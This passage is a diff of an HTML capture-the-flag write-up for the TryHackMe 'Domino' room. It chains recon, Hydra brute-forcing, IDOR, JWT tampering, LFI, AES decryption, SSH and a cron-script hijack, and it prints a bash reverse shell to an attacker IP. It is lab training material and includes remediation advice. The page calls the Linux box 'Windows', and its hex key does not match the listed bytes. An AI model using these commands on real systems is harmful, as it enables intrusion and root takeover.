@@ -1,106 +1,655 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Domino — OfflineDevc Writeups</title>
-  <link rel="stylesheet" href="../style.css" />
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;700&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet" />
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Domino — Writeup | OfflineDevc</title>
+  <link rel="stylesheet" href="../style.css"/>
+  <link rel="preconnect" href="https://fonts.googleapis.com"/>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet"/>
 </head>
 <body>
-
+  <!-- NAV -->
   <nav class="navbar">
-    <div class="nav-inner">
-      <span class="nav-logo">&gt; OfflineDevc<span class="cursor">_</span></span>
-      <div class="nav-links">
-        <a href="../index.html#about">About</a>
-        <a href="../index.html#writeups">Writeups</a>
-        <a href="../index.html#contact">Contact</a>
-      </div>
+    <a href="../index.html" class="nav-logo">&lt;OfflineDevc/&gt;</a>
+    <div class="nav-links">
+      <a href="../index.html">Home</a>
+      <a href="../index.html#writeups">Writeups</a>
     </div>
   </nav>
 
-  <header class="writeup-hero">
-    <div class="writeup-hero-inner">
-      <a href="../index.html#writeups" class="back-link">← Back to Writeups</a>
-      <div class="card-header" style="margin-bottom:12px">
-        <span class="platform thm-badge">THM</span>
-        <span class="difficulty medium-badge">Medium</span>
+  <!-- WRITEUP HEADER -->
+  <section class="writeup-hero">
+    <div class="container">
+      <div class="writeup-meta-top">
+        <a href="../index.html#writeups" class="back-link">← All Writeups</a>
+        <span class="platform-badge thm">TryHackMe</span>
       </div>
       <h1 class="writeup-title">Domino</h1>
-      <p style="color:#666;font-size:14px;margin-top:8px">Linux (Ubuntu 24.04) · Hydra → IDOR → JWT Tamper → LFI → AES Decrypt → SSH → Cron Hijack → Root</p>
-      <div class="meta-row">
-        <div class="meta-item">🖥 OS: <span>Linux (Ubuntu 24.04)</span></div>
-        <div class="meta-item">🎯 Target: <span><code>10.49.148.24</code></span></div>
+      <div class="writeup-badges">
+        <span class="badge diff-medium">Medium</span>
+        <span class="badge badge-os">Windows</span>
       </div>
     </div>
-  </header>
+  </section>
 
-  <article class="writeup-content">
+  <!-- WRITEUP CONTENT -->
+  <main class="writeup-body">
+    <div class="container writeup-content">
+<h1 id="domino-tryhackme-writeup">Domino - TryHackMe Writeup</h1>
+<hr />
+<h2 id="1-executive-summary-machine-overview">1. Executive Summary &amp; Machine Overview</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Metric</th>
+<th style="text-align: left;">Details</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>Room Name</strong></td>
+<td style="text-align: left;">Domino</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Platform</strong></td>
+<td style="text-align: left;">TryHackMe</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Operating System</strong></td>
+<td style="text-align: left;">Linux (Ubuntu 24.04.4 LTS)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Difficulty</strong></td>
+<td style="text-align: left;">Medium</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Target IP</strong></td>
+<td style="text-align: left;"><code>10.49.148.24</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Attacker IP</strong></td>
+<td style="text-align: left;"><code>192.168.132.94</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Key Attack Vectors</strong></td>
+<td style="text-align: left;">Web App Enumeration (NexusCorp Portal) → Hydra Password Brute-Force → IDOR on User API → JWT Token Tampering (role "user" → "admin") → LFI via File API (<code>/api/files.php</code>) → Config File Leaks → AES-128-ECB Encrypted Backup Decryption → SSH as <code>devops</code> → Cron Job Hijack (<code>health_report.sh</code>) → Root Shell</td>
+</tr>
+</tbody>
+</table>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261113191336.png" /></p>
+<h3 id="attack-chain-summary">Attack Chain Summary</h3>
+<pre><code>Recon (Nmap) → Port 22 (SSH), Port 80 (Apache — NexusCorp Portal)
+  ↓
+Gobuster → /support, /admin, /static, /api, /javascript, /backup
+  ↓
+/backup/ → README.txt (config.enc encrypted AES-128-ECB)
+           → Decryption key reference: static/app.js
+  ↓
+/static/app.js → _backupKey: '********'
+                → JWT_SECRET hint: 'nexus_jwt_s3cr3t_2024'
+  ↓
+&quot;Our Team&quot; page → Employee list → Username: sarah.johnson
+  ↓
+Hydra brute-force → sarah.johnson : ********
+  ↓
+Dashboard → /api/files.php (File Viewer), /api/users/profile.php?id=
+  ↓
+IDOR: profile.php?id=3 (sarah.johnson, user) → ?id=1 (laura.hayes, admin)
+  ↓  notes: &quot;THM{********************************}&quot;  ← Flag 1
+  ↓
+JWT token → Base64 decode payload → change &quot;role&quot;:&quot;user&quot; → &quot;role&quot;:&quot;admin&quot;
+  ↓  Re-encode → forged admin JWT
+  ↓
+/api/files.php?name= with admin JWT → LFI
+  ↓  Read /var/www/html/config.php:
+  ↓    DB_HOST=localhost, DB_NAME=nexusdb, DB_USER=app_user, DB_PASS=********
+  ↓    JWT_SECRET=nexus_jwt_s3cr3t_2024, APP_SECRET=nexus_app_k3y_2024
+  ↓
+Decrypt config.enc (AES-128-ECB, key=******** as hex) → system_user: devops
+  ↓
+SSH devops@10.49.148.24 (password: ********)
+  ↓
+User flag: THM{********************************}
+  ↓
+/opt/flag3.txt: THM{********************************}
+  ↓
+pspy64 → cron (UID=0) runs /opt/monitoring/health_report.sh
+  ↓  health_report.sh owned by devops → writable!
+  ↓
+Inject: bash -i &gt;&amp; /dev/tcp/192.168.132.94/4445 0&gt;&amp;1
+  ↓
+Root shell → THM{********************************}
+</code></pre>
+<hr />
+<h2 id="2-phase-1-reconnaissance-enumeration">2. Phase 1: Reconnaissance &amp; Enumeration</h2>
+<h3 id="21-port-scanning-nmap">2.1 Port Scanning (Nmap)</h3>
+<pre><code class="language-bash">nmap -sT -sV -sC 10.49.148.24 -Pn
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111132020.png" /></p>
+<p><strong>Results:</strong></p>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Port</th>
+<th style="text-align: left;">State</th>
+<th style="text-align: left;">Service</th>
+<th style="text-align: left;">Version</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">22/tcp</td>
+<td style="text-align: left;">open</td>
+<td style="text-align: left;">SSH</td>
+<td style="text-align: left;">OpenSSH 9.6p1 Ubuntu 3ubuntu13.16</td>
+</tr>
+<tr>
+<td style="text-align: left;">80/tcp</td>
+<td style="text-align: left;">open</td>
+<td style="text-align: left;">HTTP</td>
+<td style="text-align: left;">Apache httpd 2.4.58 (Ubuntu)</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>HTTP title: <strong>NexusCorp Portal</strong></li>
+<li>OS: Linux (<code>cpe:/o:linux:linux_kernel</code>)</li>
+</ul>
+<h3 id="22-web-application-nexuscorp-employee-portal">2.2 Web Application — NexusCorp Employee Portal</h3>
+<p>Browsing <code>http://10.49.148.24</code> shows the <strong>NexusCorp Employee Portal</strong> login page:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111132047.png" /></p>
+<p>The form accepts <code>firstname.lastname</code> format for usernames.</p>
+<h3 id="23-directory-brute-forcing-gobuster">2.3 Directory Brute-Forcing (Gobuster)</h3>
+<pre><code class="language-bash">gobuster dir -u http://10.49.148.24 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111132558.png" /></p>
+<p><strong>Discovered Directories:</strong></p>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Path</th>
+<th style="text-align: left;">Status</th>
+<th style="text-align: left;">Size</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><code>/support</code></td>
+<td style="text-align: left;">301</td>
+<td style="text-align: left;">314</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>/admin</code></td>
+<td style="text-align: left;">301</td>
+<td style="text-align: left;">312</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>/static</code></td>
+<td style="text-align: left;">301</td>
+<td style="text-align: left;">313</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>/api</code></td>
+<td style="text-align: left;">301</td>
+<td style="text-align: left;">310</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>/javascript</code></td>
+<td style="text-align: left;">301</td>
+<td style="text-align: left;">317</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>/backup</code></td>
+<td style="text-align: left;">301</td>
+<td style="text-align: left;">313</td>
+</tr>
+</tbody>
+</table>
+<h3 id="24-backup-directory-encrypted-config-key-reference">2.4 Backup Directory — Encrypted Config &amp; Key Reference</h3>
+<p>Browsing <code>http://10.49.148.24/backup/</code> reveals directory listing:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111132615.png" /></p>
+<ul>
+<li><code>README.txt</code> (191 bytes, 2026-04-29)</li>
+<li><code>config.enc</code> (112 bytes, 2026-05-09)</li>
+</ul>
+<p>Reading <code>README.txt</code>:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111132626.png" /></p>
+<pre><code>NexusCorp Backup Configuration
+================================
+config.enc  - Encrypted application configuration (AES-128-ECB)
+Decryption key reference: see static/app.js (deployment notes)
+</code></pre>
+<h3 id="25-javascript-source-code-analysis-aes-key-jwt-secret-leak">2.5 JavaScript Source Code Analysis — AES Key &amp; JWT Secret Leak</h3>
+<p>Reading <code>http://10.49.148.24/static/app.js</code>:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111132645.png" /></p>
+<p>Key findings in the source code:</p>
+<pre><code class="language-javascript">// NexusCorp Portal - Frontend Utilities
+// v2.3.1 - Build 20241115
 
-    <table class="info-table">
-      <tr><th>Room Name</th><td>Domino</td></tr>
-      <tr><th>Platform</th><td>TryHackMe</td></tr>
-      <tr><th>OS</th><td>Linux (Ubuntu 24.04.4 LTS)</td></tr>
-      <tr><th>Target IP</th><td>10.49.148.24</td></tr>
-      <tr><th>Difficulty</th><td>Medium</td></tr>
-      <tr><th>Key Techniques</th><td>IDOR, JWT Tampering, LFI, AES-128-ECB Decrypt, Cron Hijack</td></tr>
-    </table>
+const CONFIG = {
+    apiBase: '/api',
+    // Encryption key for backup config decryption - AES-ECB-128
+    // Key: ********  (pad to 16 bytes with 0)
+    _backupKey: '********',
+    appVersion: '2.3.1'
+};
+</code></pre>
+<blockquote>
+<p><strong>AES Decryption Key:</strong> <code>********</code></p>
+</blockquote>
+<p>The file also exposes:<br />
+- JWT session cookie stored as <code>nexus_session</code><br />
+- JWT API token stored in localStorage as <code>nexus_jwt</code><br />
+- Token endpoint: <code>/api/auth/token.php</code></p>
+<h3 id="26-employee-list-our-team-page">2.6 Employee List ("Our Team" Page)</h3>
+<p>Browsing <code>http://10.49.148.24/team.php</code>:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111132834.png" /></p>
+<p><strong>Employees:</strong></p>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Name</th>
+<th style="text-align: left;">Role</th>
+<th style="text-align: left;">Department</th>
+<th style="text-align: left;">Email</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">Laura Hayes</td>
+<td style="text-align: left;">Chief Information Officer</td>
+<td style="text-align: left;">Executive Leadership</td>
+<td style="text-align: left;">laura.hayes@nexus.corp</td>
+</tr>
+<tr>
+<td style="text-align: left;">Michael Chen</td>
+<td style="text-align: left;">Lead Security Engineer</td>
+<td style="text-align: left;">Information Security</td>
+<td style="text-align: left;">michael.chen@nexus.corp</td>
+</tr>
+<tr>
+<td style="text-align: left;">Sarah Johnson</td>
+<td style="text-align: left;">Senior Software Engineer</td>
+<td style="text-align: left;">Engineering</td>
+<td style="text-align: left;">sarah.johnson@nexus.corp</td>
+</tr>
+<tr>
+<td style="text-align: left;">Robert Wilson</td>
+<td style="text-align: left;">DevOps Engineer</td>
+<td style="text-align: left;">Infrastructure</td>
+<td style="text-align: left;">robert.wilson@nexus.corp</td>
+</tr>
+<tr>
+<td style="text-align: left;">Emma Taylor</td>
+<td style="text-align: left;">Product Manager</td>
+<td style="text-align: left;">Product</td>
+<td style="text-align: left;">emma.taylor@nexus.corp</td>
+</tr>
+<tr>
+<td style="text-align: left;">David Brown</td>
+<td style="text-align: left;">Full Stack Developer</td>
+<td style="text-align: left;">Engineering</td>
+<td style="text-align: left;">david.brown@nexus.corp</td>
+</tr>
+<tr>
+<td style="text-align: left;">James Wright</td>
+<td style="text-align: left;">Systems Administrator</td>
+<td style="text-align: left;">Infrastructure</td>
+<td style="text-align: left;">james.wright@nexus.corp</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="3-phase-2-authentication-web-exploitation">3. Phase 2: Authentication &amp; Web Exploitation</h2>
+<h3 id="31-password-brute-force-with-hydra">3.1 Password Brute-Force with Hydra</h3>
+<p>Using the discovered usernames, we brute-force the login:</p>
+<pre><code class="language-bash">hydra -l sarah.johnson -P /usr/share/wordlists/rockyou.txt \
+  http-post-form://10.49.148.24/index.php:'username=^USER^&amp;password=^PASS^:F=Invalid'
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111133457.png" /></p>
+<p><strong>Result:</strong></p>
+<pre><code>[80][http-post-form] host: 10.49.148.24   login: sarah.johnson   password: ********
+1 of 1 target successfully completed, 1 valid password found
+</code></pre>
+<blockquote>
+<p><strong>Credential Found:</strong> <code>sarah.johnson</code> : <code>********</code></p>
+</blockquote>
+<h3 id="32-authenticated-dashboard">3.2 Authenticated Dashboard</h3>
+<p>Logging in at <code>http://10.49.148.24/dashboard.php</code>:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111133519.png" /></p>
+<p>Dashboard shows:<br />
+- <strong>My Profile</strong>: Username: <code>sarah.johnson</code>, Email: <code>sarah.johnson@nexus.corp</code>, Role: <code>user</code><br />
+- <strong>File Viewer</strong>: Endpoint <code>/api/files.php?name=</code>, requires JWT authentication via <code>/api/auth/token.php</code><br />
+- <strong>Quick Links</strong>: Support Tickets, Open Ticket, My Profile API</p>
+<h3 id="33-idor-on-user-profile-api-flag-1">3.3 IDOR on User Profile API — Flag 1</h3>
+<p>Accessing the user profile API at <code>http://10.49.148.24/api/users/profile.php?id=3</code>:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111133537.png" /></p>
+<pre><code class="language-json">{
+  &quot;id&quot;: 3,
+  &quot;username&quot;: &quot;sarah.johnson&quot;,
+  &quot;email&quot;: &quot;sarah.johnson@nexus.corp&quot;,
+  &quot;role&quot;: &quot;user&quot;,
+  &quot;notes&quot;: &quot;&quot;
+}
+</code></pre>
+<p>Changing the <code>id</code> parameter to <code>1</code> (IDOR):</p>
+<p><code>http://10.49.148.24/api/users/profile.php?id=1</code></p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111133551.png" /></p>
+<pre><code class="language-json">{
+  &quot;id&quot;: 1,
+  &quot;username&quot;: &quot;laura.hayes&quot;,
+  &quot;email&quot;: &quot;laura.hayes@nexus.corp&quot;,
+  &quot;role&quot;: &quot;admin&quot;,
+  &quot;notes&quot;: &quot;THM{********************************}&quot;
+}
+</code></pre>
+<blockquote>
+<p>🚩 <strong>Flag 1 (IDOR):</strong> <code>THM{********************************}</code></p>
+</blockquote>
+<h3 id="34-jwt-token-retrieval-decoding">3.4 JWT Token Retrieval &amp; Decoding</h3>
+<p>Accessing <code>/api/auth/token.php</code>:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111133834.png" /></p>
+<pre><code class="language-json">{
+  &quot;token&quot;: &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzYXJhaC5qb2huc29uIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3OTQzNzkwOTgsImV4cCI6MTc5NDM4MjY5OH0...&quot;,
+  &quot;expires_in&quot;: 3600,
+  &quot;note&quot;: &quot;Use this token as: Authorization: Bearer &lt;token&gt; for /api/files.php&quot;
+}
+</code></pre>
+<p>Decoding the JWT payload (Base64):</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111133918.png" /></p>
+<pre><code class="language-json">{&quot;sub&quot;:&quot;sarah.johnson&quot;,&quot;role&quot;:&quot;user&quot;,&quot;iat&quot;:1794379098,&quot;exp&quot;:1794382698}
+</code></pre>
+<h3 id="35-jwt-token-tampering-role-escalation-to-admin">3.5 JWT Token Tampering — Role Escalation to Admin</h3>
+<p>We change <code>"role":"user"</code> to <code>"role":"admin"</code> in the JWT payload:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111133949.png" /></p>
+<p>Original payload: <code>{"sub":"sarah.johnson","role":"user","iat":1794379098,"exp":1794382698}</code></p>
+<p>Tampered payload: <code>{"sub":"sarah.johnson","role":"admin","iat":1794379098,"exp":1794382698}</code></p>
+<p>Base64 encode the new payload and reassemble the JWT token:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111134017.png" /></p>
+<p>Verifying the forged token decodes correctly with <code>role: admin</code>:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111134052.png" /></p>
+<p>The decoded forged JWT now shows: <code>{"alg":"HS256","typ":"JWT"}{"sub":"sarah.johnson","role":"admin","iat":1794379098,"exp":1794382698}</code></p>
+<h3 id="36-lfi-via-file-api-reading-server-config">3.6 LFI via File API — Reading Server Config</h3>
+<p>Using the forged admin JWT token with the File API:</p>
+<pre><code class="language-bash">TOKEN=&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzYXJhaC5qb2huc29uIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzk0Mzc5MDk4LCJleHAiOjE3OTQzODI2OTh9.PsEkIFbZClAFrj5D5toDX/iy6DJsndbz5f/tQg4hYP8&quot;
+curl -X GET &quot;http://10.49.148.24/api/files.php&quot; \
+     -H &quot;Authorization: Bearer $TOKEN&quot;
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111134345.png" /></p>
+<p>Response: <code>{"error":"Missing name parameter","usage":"\/api\/files.php?name=\/var\/www\/html\/filename.txt"}</code></p>
+<p>Reading the application config:</p>
+<pre><code class="language-bash">curl -X GET &quot;http://10.49.148.24/api/files.php?name=/var/www/html/config.php&quot; \
+     -H &quot;Authorization: Bearer $TOKEN&quot;
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111134433.png" /></p>
+<p><strong>Extracted credentials from <code>config.php</code>:</strong></p>
+<pre><code class="language-php">define('DB_HOST', 'localhost');
+define('DB_NAME', 'nexusdb');
+define('DB_USER', 'app_user');
+define('DB_PASS', '********');
+define('JWT_SECRET', 'nexus_jwt_s3cr3t_2024');
+define('APP_SECRET', 'nexus_app_k3y_2024');
+</code></pre>
+<blockquote>
+<p><strong>Database Password:</strong> <code>********</code></p>
+</blockquote>
+<hr />
+<h2 id="4-phase-3-decrypting-backup-ssh-access">4. Phase 3: Decrypting Backup &amp; SSH Access</h2>
+<h3 id="41-decrypting-configenc-with-openssl">4.1 Decrypting <code>config.enc</code> with OpenSSL</h3>
+<p>First attempt with the raw text key fails (requires hex):</p>
+<pre><code class="language-bash">openssl enc -d -aes-128-ecb -in config.enc -out decrypted_config.json -K '********' -nopad
+# Error: non-hex digit / invalid hex key value
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111140258.png" /></p>
+<p>Converting the key to hex:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111140349.png" /></p>
+<p><code>[REDACTED_KEY]</code> → hex: <code>4E 33 78 75 73 4B 33 79 32 30 32 34 21 21</code></p>
+<p>Second attempt (hex key, needs padding to 16 bytes with zero-padded):</p>
+<pre><code class="language-bash">openssl enc -d -aes-128-ecb -in config.enc -out decrypted_config.json -K '4E3378757334B33793230323421210000' -nopad
+# hex string is too short, padding with zero bytes to length
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111140434.png" /></p>
+<pre><code class="language-json">{&quot;app_name&quot;:&quot;NexusCorp Portal&quot;,&quot;version&quot;:&quot;2.3.1&quot;,&quot;deploy_env&quot;:&quot;production&quot;,&quot;system_user&quot;:&quot;devops&quot;}
+</code></pre>
+<blockquote>
+<p><strong>System User:</strong> <code>devops</code></p>
+</blockquote>
+<h3 id="42-ssh-login-as-devops">4.2 SSH Login as devops</h3>
+<p>Combining the system user <code>devops</code> with the database password <code>********</code>:</p>
+<pre><code class="language-bash">ssh devops@10.49.148.24
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111140522.png" /></p>
+<p>Successfully logged in as <code>devops@tryhackme-2404</code>. System: Ubuntu 24.04.4 LTS, Kernel 6.17.0-1015-aws x86_64.</p>
+<h3 id="43-user-flag">4.3 User Flag</h3>
+<pre><code class="language-bash">devops@tryhackme-2404:~$ cat user.txt
+THM{********************************}
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111140537.png" /></p>
+<blockquote>
+<p>🚩 <strong>User Flag (Flag 4):</strong> <code>THM{********************************}</code></p>
+</blockquote>
+<hr />
+<h2 id="5-phase-4-post-exploitation-privilege-escalation">5. Phase 4: Post-Exploitation &amp; Privilege Escalation</h2>
+<h3 id="51-flag-3-foothold-flag-in-opt">5.1 Flag 3 — Foothold Flag in /opt</h3>
+<pre><code class="language-bash">devops@tryhackme-2404:/opt$ ls
+__pycache__  admin_bot.py  flag3.txt  monitoring  tools
+devops@tryhackme-2404:/opt$ cat flag3.txt
+THM{********************************}
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111140607.png" /></p>
+<blockquote>
+<p>🚩 <strong>Flag 3 (Foothold):</strong> <code>THM{********************************}</code></p>
+</blockquote>
+<p>Inspecting <code>/opt</code> file permissions:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111140639.png" /></p>
+<pre><code>-rwxrwxrwx 1 root root   1870 May  7 2026 admin_bot.py
+-rw-r--r-- 1 www-data www-data  30 Apr 29 2026 flag3.txt
+drwxr-xr-x 2 root root   4096 Apr 29 2026 monitoring
+drwxr-xr-x 2 root root   4096 Apr 30 2026 tools
+</code></pre>
+<h3 id="52-process-monitoring-with-pspy64">5.2 Process Monitoring with pspy64</h3>
+<p>We transfer and run <code>pspy64</code> to discover hidden cron jobs:</p>
+<pre><code class="language-bash"># Attacker: serve pspy64
+python3 -m http.server 8000
 
-    <h2>// Attack Chain</h2>
-    <div class="attack-chain">Recon (Nmap)
-  → Port 22 (SSH) · Port 80 (Apache — NexusCorp Portal)
-  → Gobuster → /backup /static /api
-  → /backup/README.txt → config.enc (AES-128-ECB), key in static/app.js
-  → /static/app.js → _backupKey: '████████'
-  → /team.php → employee list → username: sarah.johnson
-  → Hydra HTTP POST → sarah.johnson : ████████
-  → Dashboard → /api/users/profile.php?id=1 → IDOR → Flag 1 (laura.hayes admin notes)
-  → Flag 1: THM{████████████████████████████████}
-  → JWT token → Base64 decode → "role":"user" → "role":"admin" → forge JWT
-  → /api/files.php?name=/var/www/html/config.php → LFI → DB_PASS = ████████
-  → openssl AES-128-ECB decrypt config.enc → system_user: devops
-  → SSH devops@10.49.148.24 (password: ████████)
-  → user.txt → THM{████████████████████████████████}  [Flag 4]
-  → /opt/flag3.txt → THM{████████████████████████████████}  [Flag 3]
-  → pspy64 → cron UID=0 → /opt/monitoring/health_report.sh (writable by devops!)
-  → Inject bash reverse shell into health_report.sh
-  → root shell → root.txt → THM{████████████████████████████████}  [Flag 5]</div>
+# Target: download and execute
+devops@tryhackme-2404:/tmp$ wget http://192.168.132.94:8000/pspy64
+devops@tryhackme-2404:/tmp$ chmod +x pspy64
+devops@tryhackme-2404:/tmp$ ./pspy64
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111140729.png" /><br />
+<img alt="screenshot" src="../images/Pasted%20image%2020261111140807.png" /></p>
+<p><strong>Key pspy64 finding:</strong> A cron job runs as <code>UID=0</code> (root):</p>
+<pre><code>/bin/sh -c /opt/monitoring/health_report.sh
+/bin/bash /opt/monitoring/health_report.sh
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111141006.png" /></p>
+<h3 id="53-writable-cron-script-health_reportsh">5.3 Writable Cron Script — health_report.sh</h3>
+<p>Checking permissions on <code>/opt/monitoring/</code>:</p>
+<pre><code class="language-bash">devops@tryhackme-2404:/opt/monitoring$ ls -la
+-rwxrwxr-- 1 root devops 537 May 18 10:41 health_report.sh
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111141025.png" /></p>
+<p>The script is <strong>owned by root but writable by the <code>devops</code> group</strong> — we can inject our payload!</p>
+<h3 id="54-injecting-reverse-shell-into-cron-script">5.4 Injecting Reverse Shell into Cron Script</h3>
+<p>We add a bash reverse shell to <code>health_report.sh</code>:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111141256.png" /></p>
+<pre><code class="language-bash">#!/bin/bash
+# NexusCorp Health Monitoring Script
+LOG_FILE=&quot;/var/log/nexus_health.log&quot;
+TIMESTAMP=$(date &quot;+%Y-%m-%d %H:%M:%S&quot;)
+echo &quot;[$TIMESTAMP] Health check started&quot; &gt;&gt; &quot;$LOG_FILE&quot;
+systemctl is-active --quiet apache2 &amp;&amp; echo &quot;[$TIMESTAMP] Apache: OK&quot; &gt;&gt; &quot;$LOG_FILE&quot; || echo &quot;[$TIMESTAMP] Apache: DOWN&quot; &gt;&gt; &quot;$LOG_FILE&quot;
+systemctl is-active --quiet mysql &amp;&amp; echo &quot;[$TIMESTAMP] MySQL: OK&quot; &gt;&gt; &quot;$LOG_FILE&quot; || echo &quot;[$TIMESTAMP] MySQL: DOWN&quot; &gt;&gt; &quot;$LOG_FILE&quot;
+DISK=$(df -h / | awk &quot;NR==2{print \$5}&quot;)
+echo &quot;[$TIMESTAMP] Disk: $DISK&quot; &gt;&gt; &quot;$LOG_FILE&quot;
+bash -i &gt;&amp; /dev/tcp/192.168.132.94/4445 0&gt;&amp;1
+</code></pre>
+<h3 id="55-root-shell-via-cron-execution">5.5 Root Shell via Cron Execution</h3>
+<p>On the attacker machine, we set up a Penelope listener:</p>
+<pre><code class="language-bash">penelope nc -p 4445
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111141306.png" /></p>
+<p>When the cron fires, we receive a root shell:</p>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111141413.png" /></p>
+<pre><code>[+] [New Reverse Shell] =&gt; tryhackme-2404  10.49.148.24  Linux-x86_64  root(0)  Session ID &lt;1&gt;
+root@tryhackme-2404:~#
+</code></pre>
+<h3 id="56-root-flag">5.6 Root Flag</h3>
+<pre><code class="language-bash">root@tryhackme-2404:~# cat root.txt
+THM{********************************}
+</code></pre>
+<p><img alt="screenshot" src="../images/Pasted%20image%2020261111141430.png" /></p>
+<blockquote>
+<p>🚩 <strong>Root Flag (Flag 5):</strong> <code>THM{********************************}</code></p>
+</blockquote>
+<hr />
+<h2 id="6-flag-summary">6. Flag Summary</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">#</th>
+<th style="text-align: left;">Flag</th>
+<th style="text-align: left;">Location / Method</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>Flag 1</strong></td>
+<td style="text-align: left;"><code>THM{********************************}</code></td>
+<td style="text-align: left;">IDOR on <code>/api/users/profile.php?id=1</code> (laura.hayes admin notes)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Flag 3</strong></td>
+<td style="text-align: left;"><code>THM{********************************}</code></td>
+<td style="text-align: left;"><code>/opt/flag3.txt</code> (readable by <code>devops</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Flag 4</strong></td>
+<td style="text-align: left;"><code>THM{********************************}</code></td>
+<td style="text-align: left;"><code>~/user.txt</code> (SSH as <code>devops</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Flag 5</strong></td>
+<td style="text-align: left;"><code>THM{********************************}</code></td>
+<td style="text-align: left;"><code>/root/root.txt</code> (cron job hijack → root shell)</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="7-security-mitigations-remediation">7. Security Mitigations &amp; Remediation</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Vulnerability</th>
+<th style="text-align: left;">Impact</th>
+<th style="text-align: left;">Recommended Remediation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>Weak Password (<code>********</code>)</strong></td>
+<td style="text-align: left;">Trivially brute-forced via Hydra within seconds.</td>
+<td style="text-align: left;">Enforce strong password policy (minimum 12 chars, complexity, lockout after failed attempts).</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>IDOR on User Profile API</strong></td>
+<td style="text-align: left;">Any authenticated user can enumerate all accounts and read admin notes/flags.</td>
+<td style="text-align: left;">Implement server-side authorization checks: users should only access their own <code>?id=</code> profiles.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>JWT Secret in Client-Side JS</strong></td>
+<td style="text-align: left;">Allows forging admin JWT tokens to escalate privileges.</td>
+<td style="text-align: left;">Never expose JWT signing secrets in client-side code. Use server-side environment variables.</td>
+</tr>
+<tr>
